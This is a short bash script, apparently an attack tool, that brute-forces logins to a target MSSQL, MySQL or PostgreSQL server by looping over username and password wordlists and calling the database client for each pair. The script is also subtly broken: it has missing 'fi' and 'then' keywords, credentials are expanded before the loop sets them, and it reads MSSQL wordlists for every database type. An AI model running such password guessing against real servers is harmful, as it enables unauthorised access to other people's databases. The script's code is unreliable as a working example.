#!/bin/bash

if [ "$1" == "" ]; then
    echo;echo "[>] Usage: $0 <target>";echo

echo;read -p "Database: [1] MSSQL [2] MySQL [3] PostgreSQL > " db

if [ "$db" == "1" ]; then
    query="mssqlclient.py $u:$p@$1"
elif [ "$db" == "2" ]
    query="mysql -h $1 --user=$u --password=$p"
elif [ "$db" == "3" ]
    query="psql postgresql://$u:$p@$1"
else
    exit
    
for u in $(cat mssql-users.txt);do
    for p in $(cat mssql-pass.txt);do
        echo $u:$p
        $query
    done
done
